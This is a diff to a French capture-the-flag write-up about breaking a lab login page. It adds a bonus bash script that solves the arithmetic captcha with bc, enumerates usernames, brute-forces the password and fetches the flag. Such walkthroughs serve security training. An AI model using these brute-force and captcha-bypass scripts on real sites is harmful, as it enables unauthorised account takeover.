@@ -30,7 +30,7 @@ On commence donc par écrire le script suivant pour extraire le username.
 
 ```
 #!/bin/bash
-curl 'http://10.10.240.139/login' -X POST \
+curl 'http://10.10.240.139/login' -s -X POST \
   --data-raw 'username=test&password=test' > lastresponse
 
 
@@ -43,7 +43,7 @@ for i in $(cat usernames.txt); do
         user=$(echo $i|sed 's/[^a-z]//g')
 
         # new attempt
-        curl 'http://10.10.240.139/login' -X POST \
+        curl 'http://10.10.240.139/login' -s -X POST \
           --data-raw "username=$user&password=test&captcha=$captcha" \
           > lastresponse
 
@@ -56,7 +56,7 @@ done
 Y'a plus qu'à :
 ```
 ┌──(root㉿kali)-[~/Downloads]
-└─# ./get_username.sh 2>/dev/null
+└─# ./get_username.sh
     <p class="error"><strong>Error:</strong> Invalid password for user &#39;xxxREDACTEDxxx&#39;
 xxxREDACTEDxxx
 ```
@@ -67,16 +67,16 @@ Et hop on a le username en quelques secondes.
 On va faire exactement pareil, à un détail près : si on trouve le bon password, on risque de _ne pas_ avoir de message d'erreur. **Mais** on n'aura probablement aucun captcha à calculer pour la fois suivante -- donc le message suivant sera probablement "Invalid Captcha"
 
 ```
-curl 'http://10.10.240.139/login' -X POST \
+curl 'http://10.10.240.139/login' -s -X POST \
   --data-raw 'username=test&password=test' > lastresponse
 
-$previous=
+previous=
 for i in $(cat passwords.txt); do
         # Get captcha ...
         captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)
         # Too lazy again...
         password=$(echo $i | sed 's/[^a-zA-Z0-9]//')
-        curl 'http://10.10.240.139/login' -X POST \
+        curl 'http://10.10.240.139/login' -s -X POST \
           --data-raw "username=$1&password=$password&captcha=$captcha" \
           > lastresponse
         cat lastresponse | sed -n '105p' | grep -v "Invalid password for" \
@@ -89,7 +89,7 @@ Encore une fois, y'a plus qu'à :
 
 ```
 ┌──(root㉿kali)-[~/Downloads]
-└─# ./get_password.sh xxxREDACTED_USERxxx 2>/dev/null
+└─# ./get_password.sh xxxREDACTED_USERxxx
     <p class="error"><strong>Error:</strong> Invalid captcha
 xxxREDACTED_PASSWORDxxx
 ```
@@ -97,4 +97,52 @@ xxxREDACTED_PASSWORDxxx
 ## Etape 4 (et dernière) : trouver le flag
 Là, c'est plutôt simple : on se logge avec le username et le password qu'on a trouvé : il s'affiche. Tout simplement.
 
+Bonus : le script suivant automatise toute la résolution (username, password, et même flag)
+
+```
+#!/bin/bash
+curl 'http://10.10.240.139/login' -s -X POST \
+  --data-raw 'username=test&password=test' > lastresponse
+
+for i in $(cat usernames.txt); do
+        # Get captcha answer from last HTTP responsei, line 97
+        # (use bc to get the result)
+        captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)
+
+        # username cleansing - too lazy to set IFS
+        user=$(echo $i|sed 's/[^a-z]//g')
+
+        # new attempt
+        curl 'http://10.10.240.139/login' -s -X POST \
+          --data-raw "username=$user&password=test&captcha=$captcha" \
+          > lastresponse
+
+        # check if last response is different
+        cat lastresponse | sed -n '105p' | grep -v "does not exist" \
+        > /dev/null && break
+done
+
+echo Found username: $user
+
+previous=
+for i in $(cat passwords.txt); do
+        # Get captcha ...
+        captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)
+        # Too lazy again...
+        password=$(echo $i | sed 's/[^a-zA-Z0-9]//')
+        curl 'http://10.10.240.139/login' -s -X POST \
+          --data-raw "username=$user&password=$password&captcha=$captcha" \
+          > lastresponse
+        cat lastresponse | sed -n '105p' | grep -v "Invalid password for" \
+         > /dev/null && break
+        previous=$password
+done
+
+echo Found password: $previous
+
+captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)
+curl 'http://10.10.240.139/login' -s -X POST \
+  --data-raw "username=$user&password=$previous&captcha=$captcha" \
+  | sed 's/<[^>]*>//g'
+```
 Et voilà !
